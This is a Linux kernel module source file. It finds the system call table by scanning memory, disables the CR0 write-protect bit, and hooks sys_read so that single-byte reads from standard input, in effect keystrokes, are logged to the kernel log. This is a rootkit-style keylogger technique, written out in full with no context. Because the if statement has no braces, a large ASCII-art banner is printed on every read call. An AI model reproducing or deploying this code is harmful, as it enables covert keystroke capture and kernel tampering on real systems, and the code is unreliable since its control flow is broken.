#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <asm/paravirt.h>

unsigned long **sys_call_table;
unsigned long original_cr0;

asmlinkage long (*ref_sys_read)(unsigned int fd, char __user *buf, size_t count);

asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count)
{
	long ret;
	ret = ref_sys_read(fd, buf, count);

	if(count == 1 && fd == 0)
		printk(KERN_INFO "intercept: 0x%02X\n", buf[0]);
		printk(KERN_ALERT "\n");
		printk(KERN_ALERT "\n");
		printk(KERN_ALERT "  ______                         __      __   ______           \n");
		printk(KERN_ALERT " /      \\                       /  |    /  | /      \\          \n");
		printk(KERN_ALERT "/$$$$$$  |  ______    ______   _$$ |_   $$/ /$$$$$$  |__    __ \n");
		printk(KERN_ALERT "$$ \\__$$/  /      \\  /      \\ / $$   |  /  |$$ |_ $$//  |  /  |\n");
		printk(KERN_ALERT "$$      \\ /$$$$$$  |/$$$$$$  |$$$$$$/   $$ |$$   |   $$ |  $$ |\n");
		printk(KERN_ALERT " $$$$$$  |$$ |  $$ |$$ |  $$ |  $$ | __ $$ |$$$$/    $$ |  $$ |\n");
		printk(KERN_ALERT "/  \\__$$ |$$ |__$$ |$$ \\__$$ |  $$ |/  |$$ |$$ |     $$ \\__$$ |\n");
		printk(KERN_ALERT "$$    $$/ $$    $$/ $$    $$/   $$  $$/ $$ |$$ |     $$    $$ |\n");
		printk(KERN_ALERT " $$$$$$/  $$$$$$$/   $$$$$$/     $$$$/  $$/ $$/       $$$$$$$ |\n");
		printk(KERN_ALERT "          $$ |                                       /  \\__$$ |\n");
		printk(KERN_ALERT "          $$ |                                       $$    $$/ \n");
		printk(KERN_ALERT "          $$/                                         $$$$$$/  \n");
		printk(KERN_ALERT "\n");
		printk(KERN_ALERT "\n");

	return ret;
}

static unsigned long **aquire_sys_call_table(void)
{
	unsigned long **sct;
	unsigned long int offset;

	for(offset = PAGE_OFFSET; offset < ULLONG_MAX; offset += sizeof(void *))
	{
		sct = (unsigned long **)offset;

		if (sct[__NR_close] == (unsigned long *) sys_close) 
			return sct;
	}

	return NULL;
}

static int __init interceptor_start(void) 
{
	if(!(sys_call_table = aquire_sys_call_table()))
		return -1;

	/* backup control register */
	original_cr0 = read_cr0();

	/* The WP bit is the 16th bit of the cr0 register and we can manipulate it by some simple bitmasking. */
	write_cr0(original_cr0 & ~0x00010000);
	ref_sys_read = (void *)sys_call_table[__NR_read];
	sys_call_table[__NR_read] = (unsigned long *)new_sys_read;
	write_cr0(original_cr0);

	return 0;
}

static void __exit interceptor_end(void) 
{
	if(!sys_call_table)
		return;

	write_cr0(original_cr0 & ~0x00010000);
	sys_call_table[__NR_read] = (unsigned long *)ref_sys_read;
	write_cr0(original_cr0);
	printk(KERN_ALERT "Removing interceptor\n");
}

module_init(interceptor_start);
module_exit(interceptor_end);

MODULE_LICENSE("GPL");
